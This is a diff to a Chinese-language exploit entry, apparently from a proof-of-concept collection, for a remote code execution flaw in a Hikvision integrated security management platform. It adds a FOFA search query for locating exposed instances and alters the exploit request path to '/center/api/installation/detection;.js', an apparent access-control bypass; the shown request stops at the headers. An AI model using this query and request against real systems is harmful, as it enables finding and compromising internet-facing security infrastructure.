@@ -1,8 +1,15 @@
 ## 海康威视综合安防系统detection接口存在RCE漏洞
 
-## poc
+## fofa
+
 ```
-POST /center/api/installation/detection HTTP/1.1
+app="HIKVISION-综合安防管理平台" ||app="HIKVISION-iSecure-Center"
+```
+
+## poc
+
+```
+POST /center/api/installation/detection;.js HTTP/1.1
 Host: xx.xx.xx.xx
 Cache-Control: max-age=0
 Sec-Ch-Ua: "Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"
